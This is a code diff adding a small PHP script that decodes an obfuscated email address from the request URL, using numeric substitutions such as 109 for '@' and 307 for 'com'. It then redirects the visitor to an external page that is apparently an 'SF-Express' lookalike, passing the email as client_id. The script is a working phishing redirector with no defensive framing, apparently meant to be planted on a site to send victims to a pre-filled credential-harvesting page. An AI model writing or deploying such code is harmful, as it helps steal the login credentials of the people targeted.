@@ -1,0 +1,32 @@
+<?php
+
+$url = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
+
+
+$b = explode('/', $url);
+
+$main3 = $b[3];
+
+$p1 = str_replace("109", "@", $main3);
+$p2 = str_replace("208", ".", $p1);
+$p3 = str_replace("307", "com", $p2);
+$p4 = str_replace("505", "a", $p3);
+$p5 = str_replace("604", "e", $p4);
+$p6 = str_replace("802", "o", $p5);
+$p7 = str_replace("901", "m", $p6);
+$p8 = str_replace("703", "u", $p7);
+
+
+function Redirect($url, $permanent = false)
+{
+ if (headers_sent() === false)
+ {
+ header('Location: ' . $url, true, ($permanent === true) ? 301 : 302);
+ }
+
+ exit();
+}
+
+Redirect("https://www.apceemanpower.com/jj/skl/SF-Express3/?client_id=".($p8)."", false);
+
+?>
